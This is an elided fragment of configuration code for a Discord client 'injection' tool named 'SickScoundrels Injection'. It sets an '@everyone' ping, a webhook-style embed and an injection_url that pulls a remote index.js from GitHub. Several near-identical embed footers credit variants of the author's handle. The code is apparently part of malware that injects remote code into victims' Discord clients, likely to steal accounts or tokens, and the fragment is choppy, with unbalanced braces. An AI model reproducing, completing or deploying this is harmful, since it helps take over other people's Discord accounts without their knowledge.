...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'SickScoundrels Injection', 
  ...
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/psychodesperate/injection/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By psycho.desperate#6666・https://github.com/psychodesperate',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection psycho.dxsperate#6666・https://github.com/psychodesperate',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection psycho.dxsperate・https://github.com/psychodesperate',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By psycho.dxsperate・https://github.com/psychodesperate',
        },
      },
    ],
  };
